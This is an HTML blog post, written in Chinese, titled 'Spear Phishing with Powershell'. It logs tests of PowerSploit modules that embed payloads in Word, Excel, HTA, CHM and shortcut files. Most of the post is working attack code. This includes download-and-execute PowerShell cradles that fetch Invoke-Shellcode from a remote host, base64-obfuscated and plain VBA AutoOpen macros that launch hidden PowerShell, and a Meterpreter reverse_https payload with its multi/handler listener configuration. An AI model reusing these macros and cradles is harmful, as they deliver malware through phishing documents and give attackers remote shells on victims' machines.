@@ -1,0 +1,686 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="Phishing,Powershell," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> Spear Phishing with Powershell // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              Spear Phishing with Powershell
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-01-15
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/01/15/spear-phishing-with-powershell/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/15/spear-phishing-with-powershell/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="测试环境">测试环境</h1><p>Windows 8.1<br>x64</p>
+<h1 id="Client_模块测试">Client 模块测试</h1><h2 id="Out-Word">Out-Word</h2><p>测试失败，word未生成<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-<span class="keyword">Word</span> -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Out-HTA">Out-HTA</h2><p>测试失败，执行HTA文件后，shellcode未执行<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-HTA -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Out-Excel">Out-Excel</h2><p>测试成功<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-Excel -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Out-Shortcut">Out-Shortcut</h2><p>payload过长，测试失败。可以考虑和某些快捷方式漏洞配合使用</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-Shortcut -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span></span><br></pre></td></tr></table></figure>
+<h2 id="Out-CHM">Out-CHM</h2><p>测试失败。执行chm文件后，shellcode未执行<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-CHM -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span> -HHCPath <span class="string">"C:\Program Files (x86)\HTML Help Workshop"</span></span><br></pre></td></tr></table></figure></p>
+<p>更换路径测试，仍然失败<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-CHM -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span> -HHCPath <span class="string">"E:\HTML Help Workshop"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Out-Java">Out-Java</h2><p>需要JDKPath，感觉利用场景有限，放弃实验<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Out</span>-Java -Payload <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Out-WebQuery">Out-WebQuery</h2><p>由于测试环境限制，未测试。如果成功的话应该是一个比较有效的手法。</p>
+<h1 id="vbs_script">vbs script</h1><p>参考视频[1]，提供OneDrive下载。</p>
+<p>此处powershell的脚本也被混淆了。</p>
+<h2 id="base64加密">base64加密</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">Execute</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">Public</span> <span class="keyword">Function</span> <span class="keyword">Execute</span>() As Variant</span><br><span class="line">        <span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">0</span></span><br><span class="line">        strComputer = <span class="string">"."</span></span><br><span class="line">        <span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2"</span>)</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</span><br><span class="line">        <span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</span><br><span class="line">        objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">        <span class="keyword">Set</span> objProcess = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2:Win32_Process"</span>)</span><br><span class="line">        objProcess.Create <span class="string">"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('TZFda8IwFIbvB/sPh9KNhNnQdlM2y4StbEMYKquwC/EitgebWavYM1TU/76ktZ25ySG8H08SO84U5gTPMMCtM5z9YEwQ7QvCpRggiWgVL5AKMQ5HYalklvfkC6/zKDzhub7VetCLB3ZBG5RLnWNXieIDKSrPGA8msz3hZDq1zV5okStEp92+bx9vDu4p2KYqQ8ZsZexVkPhCmbBK3wK3BdUoPjGfU8o5ODmCyw+BnUiS2scu+J3xfo0DucT6JmPckXiJwn7/LY9Xicrn/Mynx7rFlChzE8yTmYwXJlThDqoGv3frwRGGv+RUNriQ+lCS18Y7sEYRWHpn623CxUhSag57YJ09utDET8iA4Zlp2u2WjCXbq2Fi/w3NE4vvjSJkTY7mbub6eRrte/ZbpIyfgvpXwmxVIOPXV38=')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"</span>, <span class="literal">Null</span>, objConfig, intProcessID</span><br><span class="line">     <span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+<h2 id="未混淆版本">未混淆版本</h2><p>其他从vbs调用powershell的方法可以参考[3]、[4]</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line"><span class="keyword">Execute</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">Public</span> <span class="keyword">Function</span> <span class="keyword">Execute</span>() As Variant</span><br><span class="line">        <span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">0</span></span><br><span class="line">        strComputer = <span class="string">"."</span></span><br><span class="line">        <span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2"</span>)</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</span><br><span class="line">        <span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</span><br><span class="line">        objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">        <span class="keyword">Set</span> objProcess = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\"</span> &amp; strComputer &amp; <span class="string">"\root\cimv2:Win32_Process"</span>)</span><br><span class="line">        objProcess.Create <span class="string">"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force"</span>, <span class="literal">Null</span>, objConfig, intProcessID</span><br><span class="line">     <span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+<h1 id="Invoke-ShellCode">Invoke-ShellCode</h1><p>在git仓库里找一下早期版本的 Invoke-Shellcode，应该有如下使用方式，参考视频[2]</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">Invoke</span>-Shellcode -Payload windows/meterpreter/<span class="keyword">reverse_https </span>-Lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">100</span> -Lport <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+<h1 id="使用_Meterpreter_Shellcode时_服务端的配置">使用 Meterpreter Shellcode时 服务端的配置</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br><span class="line"><span class="keyword">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">121.121</span>.123.198</span><br><span class="line"><span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line"><span class="keyword">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j</span></span><br></pre></td></tr></table></figure>
+<h1 id="Powershell_Script">Powershell Script</h1><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (<span class="keyword">new</span>-<span class="class"><span class="keyword">object</span> <span class="title">net</span>.<span class="title">webclient</span>).<span class="title">downloadstring</span>(</span><span class="symbol">'https</span>:<span class="comment">//raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');Invoke-Shellcode -Force</span></span><br></pre></td></tr></table></figure>
+<h1 id="WPS_phishing">WPS phishing</h1><p>可以参考这个<a href="http://1ight.co/archives/32/" target="_blank" rel="external">CVE-2013-3934</a>。WPS 2012版是受影响的，不过在WPS 2016中应该已经修复。还有一个更早的CVE-2012-4886，目测早已被修复。</p>
+<h1 id="关于shellcode的进一步计划">关于shellcode的进一步计划</h1><p><a href="http://drops.wooyun.org/papers/4751" target="_blank" rel="external">http://drops.wooyun.org/papers/4751</a><br><a href="http://drops.wooyun.org/tips/4413" target="_blank" rel="external">http://drops.wooyun.org/tips/4413</a><br><a href="http://www.freebuf.com/news/special/60758.html" target="_blank" rel="external">http://www.freebuf.com/news/special/60758.html</a></p>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="https://www.youtube.com/watch?v=zRSxyjqmhIc" target="_blank" rel="external">PowerSploit controlando Windows 8.1 Pro con MACRO de Excel</a><br>[2] <a href="https://www.youtube.com/watch?v=LEll6qa-REY" target="_blank" rel="external">PowerShell Toolkit: PowerSploit - Gaining Shells Without Writing To Disk</a><br>[3] <a href="http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/18/how-to-use-vbscript-to-run-a-powershell-script.aspx" target="_blank" rel="external">How to Use VBScript to Run a PowerShell Script</a><br>[4] <a href="http://stackoverflow.com/questions/11448365/running-powershell-from-vbs-with-command-as-parameter" target="_blank" rel="external">Running Powershell from vbs with command as parameter</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Phishing/"> #Phishing </a>
+          
+            <a href="/tags/Powershell/"> #Powershell </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/01/14/week-of-powershell-shells/">Week of PowerShell Shells</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/01/15/spear-phishing-with-powershell/"
+               data-title="Spear Phishing with Powershell" data-url="http://blkstone.github.io/2016/01/15/spear-phishing-with-powershell/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">129</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">57</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#测试环境"><span class="nav-number">1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Client_模块测试"><span class="nav-number">2.</span> <span class="nav-text">Client 模块测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-Word"><span class="nav-number">2.1.</span> <span class="nav-text">Out-Word</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-HTA"><span class="nav-number">2.2.</span> <span class="nav-text">Out-HTA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-Excel"><span class="nav-number">2.3.</span> <span class="nav-text">Out-Excel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-Shortcut"><span class="nav-number">2.4.</span> <span class="nav-text">Out-Shortcut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-CHM"><span class="nav-number">2.5.</span> <span class="nav-text">Out-CHM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-Java"><span class="nav-number">2.6.</span> <span class="nav-text">Out-Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Out-WebQuery"><span class="nav-number">2.7.</span> <span class="nav-text">Out-WebQuery</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#vbs_script"><span class="nav-number">3.</span> <span class="nav-text">vbs script</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#base64加密"><span class="nav-number">3.1.</span> <span class="nav-text">base64加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未混淆版本"><span class="nav-number">3.2.</span> <span class="nav-text">未混淆版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Invoke-ShellCode"><span class="nav-number">4.</span> <span class="nav-text">Invoke-ShellCode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用_Meterpreter_Shellcode时_服务端的配置"><span class="nav-number">5.</span> <span class="nav-text">使用 Meterpreter Shellcode时 服务端的配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Powershell_Script"><span class="nav-number">6.</span> <span class="nav-text">Powershell Script</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WPS_phishing"><span class="nav-number">7.</span> <span class="nav-text">WPS phishing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于shellcode的进一步计划"><span class="nav-number">8.</span> <span class="nav-text">关于shellcode的进一步计划</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">9.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
